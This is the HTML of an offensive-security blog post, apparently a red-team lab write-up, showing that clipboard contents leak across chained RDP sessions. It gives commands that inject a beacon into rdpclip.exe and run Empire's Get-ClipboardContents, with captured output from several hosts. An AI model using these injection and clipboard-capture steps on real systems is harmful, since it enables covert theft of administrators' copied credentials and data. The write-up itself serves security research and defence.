@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">RDPClip</h1>
+    
+      
+    <nav id="TableOfContents"></nav>
+    <p>This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.</p>
+<p>Vincent Yiu already published details of a great attack called <a href="https://www.mdsec.co.uk/2017/06/rdpinception/">RDPInception</a>, which allows an adversary to &ldquo;swim&rdquo; back up an RDP session if drive sharing is enabled.  Drive sharing is not enabled by default but clipboard monitoring is, making it particularly potent and prevelant.</p>
+<p>I set up a little lab to test to what extent clipboard contents are exposed.</p>
+<figure>
+    <img src="/images/rdpclip/network.png"/> 
+</figure>
+
+<p>The idea is that both DMZ1 and DMZ2 are only accessed via an RDP &ldquo;Jump Box&rdquo; on the main LAN.  Based on my experience, it&rsquo;s very common for sysadmins to manage these &ldquo;segregated&rdquo; networks from production environments via RDP.</p>
+<p>The <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-ClipboardContents.ps1">Get-ClipboardContents</a> module from Empire allows you to capture the clipboard of a user.  If an admin RDP&rsquo;s into DMZ2 from the LAN, we can inject this capability into one of their processes and see what they&rsquo;re copying/pasting within DMZ2.</p>
+<p>But as it happens, the scope of what we can read is not limited to DMZ2.</p>
+<p>We can guess that someone is using RDP based on an established incoming connection on port 3389, and a process synonymous with RDP: <code>rdpclip.exe</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">TCP    192.168.2.200:3389     192.168.0.200:63340    ESTABLISHED
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">PID   PPID  Name                         Arch  Session     User
+---   ----  ----                         ----  -------     -----
+1084  680   ShellExperienceHost.exe      x64   3           DMZ2\rasta
+2248  1096  explorer.exe                 x64   3           DMZ2\rasta
+3280  680   SearchUI.exe                 x64   3           DMZ2\rasta
+3332  680   RuntimeBroker.exe            x64   3           DMZ2\rasta
+3652  1232  sihost.exe                   x64   3           DMZ2\rasta
+3668  584   svchost.exe                  x64   3           DMZ2\rasta
+3836  1232  taskhostw.exe                x64   3           DMZ2\rasta
+3924  888   rdpclip.exe                  x64   3           DMZ2\rasta
+4368  680   dllhost.exe                  x64   3           DMZ2\rasta
+</code></pre></div><p>Inject a beacon into <code>rdpclip</code>, then import and run <code>Get-ClipboardContents</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">beacon&gt; inject 3924 x64 smb
+beacon&gt; powershell-import D:\Tools\Get-ClipboardContents.ps1
+beacon&gt; powershell Get-ClipboardContents -PollInterval 1
+</code></pre></div><p>I was first able to verify that I could capture the clipboard from inside the DMZ2 RDP session.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[+] received output:
+=== 09/06/2018:13:12:26:91 ===
+
+hello from dmz2
+</code></pre></div><p>Now it started getting interesting&hellip;  When RDP&rsquo;d into DMZ1 from the LAN whilst still connected to DMZ2, it turns out we can capture the DMZ1 clipboard from within DMZ2.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[+] received output:
+=== 09/06/2018:13:19:11:09 ===
+
+hello from dmz1
+</code></pre></div><p>Not only that, but also from both the Jump Box and the source workstation on the LAN.</p>
+<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">[+] received output:
+=== 09/06/2018:13:20:40:50 ===
+
+hello from the lan jump box
+
+[+] received output:
+=== 09/06/2018:13:21:34:25 ===
+
+and hello from the lan workstation!
+</code></pre></div><figure>
+    <img src="/images/rdpclip/RDP.png"/> 
+</figure>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/xsl/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/applocker/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
